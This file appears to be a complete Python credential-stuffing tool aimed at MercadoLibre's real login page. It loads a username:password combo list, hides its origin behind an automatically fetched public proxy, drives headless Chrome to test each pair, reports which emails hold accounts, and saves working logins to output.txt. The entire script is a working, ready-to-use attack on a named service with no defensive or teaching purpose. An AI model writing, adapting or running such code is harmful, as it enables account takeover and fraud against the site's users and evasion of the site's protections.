#!/usr/bin/python3
#coding: utf-8

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException
from colorama import Fore, Back, Style
from proxybroker import Broker
import time, colorama, os, sys, asyncio


#initialize colorama
colorama.init()
white = Fore.WHITE
green = Fore.GREEN
red = Fore.RED
yellow = Fore.YELLOW
end = Style.RESET_ALL
info = Fore.YELLOW + '[!]' + Style.RESET_ALL
que = Fore.BLUE + '[*]' + Style.RESET_ALL
bad = Fore.RED + '[-]' + Style.RESET_ALL
good = Fore.GREEN + '[+]' + Style.RESET_ALL
run = Fore.WHITE + '[~]' + Style.RESET_ALL

#<-LOGO->

logo = yellow + '''
  __  __  _            _____  _                  _               
 |  \/  || |          / ____|| |                | |              
 | \  / || |  ______ | |     | |__    ___   ___ | | __ ___  _ __ 
 | |\/| || | |______|| |     | '_ \  / _ \ / __|| |/ // _ \| '__|
 | |  | || |____     | |____ | | | ||  __/| (__ |   <|  __/| |   
 |_|  |_||______|     \_____||_| |_| \___| \___||_|\_\\\___||_|   
''' + end

print (logo)

#<-PROXY->
class proxyy:
	pxy = ''

def get_proxy():
	proxies = asyncio.Queue()
	broker = Broker(proxies)
	tasks = asyncio.gather(
		broker.find(types=['HTTP'], limit=1),
		show(proxies))
	loop = asyncio.get_event_loop()
	loop.run_until_complete(tasks)

async def show(proxies):
	while True:
		proxy = await proxies.get()
		if proxy is None: break
		proxy = str(proxy)
		proxy = proxy.split('] ')
		proxy.pop(0)
		x = proxy.pop(0)
		x = x [:-1]
		proxyy.pxy = x

#<-INPUT/OUTPU->
def make_list(filename):
	username_list = []
	password_list = []
	with open (filename,'r') as f:
		passlist = [line.strip() for line in f]
		for item in passlist:
			login_split = item.split(":")
			username_list.append(login_split[0])
			password_list.append(login_split[1])
	return username_list,password_list

#<-Find Elements->
def find_elements_email(driver):
	username = driver.find_element_by_name('user_id')
	login_button = driver.find_element_by_xpath('//*[@id="login_user_form"]/div[2]/input')
	return username,login_button

def find_elements_pass(driver):
	password = driver.find_element_by_name('password')
	login_button2 = driver.find_element_by_xpath('//*[@id="action-complete"]')
	return password,login_button2

def find_elements_link(driver):
	redirect = driver.find_element_by_xpath('//*[@id="login_user_form"]/div[1]/div/div/label/span/span/div/div/a')
	return redirect

#<-Send Keys->	
def send_userid(u,login_button,uName):
	u.send_keys(uName)
	login_button.click()

def send_password(p,login_button2,pWord):
	p.send_keys(pWord)
	login_button2.click()

def send_link(redirect):
	redirect.click()

#<-Validate condition->
def is_userid(driver,username):
	try:
		username = driver.find_element_by_xpath('//*[@id="login_user_form"]/div[1]/div/div/label/span/span/div/div')
		return False
	except:
		return True

def is_password(driver,password):
	try:
		password = driver.find_element_by_xpath('//*[@id="login_user_form"]/div[1]/div[1]/label/span/span/div/div')
		return False
	except:
		return True

def is_location(driver):
	try:
		link = driver.find_element_by_xpath("//a[contains(@href,'login?platform_id=ML')]")
		return False
	except NoSuchElementException:
		return True

#<-Init selenium->
def initialize_driver():
	get_proxy()
	proxy = proxyy.pxy

	PROXY = proxy
	service_arg = [
		'--proxy-server=' + PROXY,
		'--proxy-type=html'
	]
	chrome_options = Options()
	chrome_options.add_argument("--incognito")
	chrome_options.add_argument("--headless")
	chrome_options.add_argument("--no-sandbox")
	if 'win' in sys.platform :
		driver = webdriver.Chrome(chrome_options=chrome_options, executable_path='chromedriver.exe', service_args=service_arg)
	else:
		driver = webdriver.Chrome(chrome_options=chrome_options, executable_path='/root/ml-checker/chromedriver', service_args=service_arg)
	return driver
	
if __name__=="__main__":
	if 'win' in sys.platform:
		os.system('taskkill /IM chromedriver.exe /F')
	else:
		os.system("killall 'Google Chrome'")
	filename = input('Filename: ')
	driver = initialize_driver()
	driver.get('https://www.mercadolibre.com/jms/mla/lgz/msl/login/')
	time.sleep(5)
	username,login_button = find_elements_email(driver)
	username_list,password_list = make_list(filename)
	pass_list_length = len(username_list)
	print (que + "{0} logins loaded successfully".format(pass_list_length) + end)
	for i in range(0, pass_list_length):
		username,login_button = find_elements_email(driver)
		uName = username_list[i]
		send_userid(username,login_button,uName)
		try:
			is_link = is_location(driver)
			driver.implicitly_wait(2)
			if is_link:
				redirect = find_elements_link(driver)
				print(info + uName + ' has an account in another location')
				send_link(redirect)
				url = '{0}'.format(driver.current_url)
				driver.get(url)
				username,login_button = find_elements_email(driver)
				uName = username_list[i]
				send_userid(username,login_button,uName)
				driver.implicitly_wait(2)
				print(good + uName + ' has an account in mercadolibre')
				password,login_button2 = find_elements_pass(driver)
				pWord = password_list[i]
				send_password(password,login_button2,pWord)
				driver.implicitly_wait(2)
				valid_pass = is_password(driver,password)
				if valid_pass:
					output = open("output.txt", "w")
					print (good + "Logged in as {0} with password {1}".format(uName,pWord))
					output.writelines('{0}:{1}\n'.format(uName,pWord))
					driver.get('https://www.mercadolibre.com/jms/mla/lgz/msl/login/')
					continue
				else:
					print (bad + "Failed to login as {0} with password {1}".format(uName,pWord))
					driver.get('https://www.mercadolibre.com/jms/mla/lgz/msl/login/')
					print (que + "Attempt {0}/{1}".format(i+1,pass_list_length))
			else:
				print (bad + "{0} doesn`t have a mercadolibre account".format(uName))
				driver.get('https://www.mercadolibre.com/jms/mla/lgz/msl/login/')
				print (que + "Attempt {0}/{1}".format(i+1,pass_list_length))
		except KeyboardInterrupt:
			clear = ''
			if 'win' in sys.platform:
				clear = 'cls'
			else:
				clear = 'clear'
			print ("\n" * 80)
			os.system(clear)
			print (logo)
			print(info + " ~ Thanks to use this script! <3")
			sys.exit(0)
		except NoSuchElementException:
			valid = is_userid(driver,username)
			driver.implicitly_wait(2)
			if valid:
				print(good + uName + ' has an account in mercadolibre')
				password,login_button2 = find_elements_pass(driver)
				pWord = password_list[i]
				send_password(password,login_button2,pWord)
				time.sleep(2)
				valid_pass = is_password(driver,password)
				if valid_pass:
					output = open("output.txt", "w")
					print (good + "Logged in as {0} with password {1}".format(uName,pWord))
					output.writelines('{0}:{1}\n'.format(uName,pWord))
					continue
				else:
					print (bad + "Failed to login as {0} with password {1}".format(uName,pWord))
					driver.get('https://www.mercadolibre.com/jms/mla/lgz/msl/login/')
					print (que + "Attempt {0}/{1}".format(i+1,pass_list_length))
			else:
				print (bad + "{0} doesn`t have a mercadolibre account".format(uName))
				driver.get('https://www.mercadolibre.com/jms/mla/lgz/msl/login/')
				print (que + "Attempt {0}/{1}".format(i+1,pass_list_length))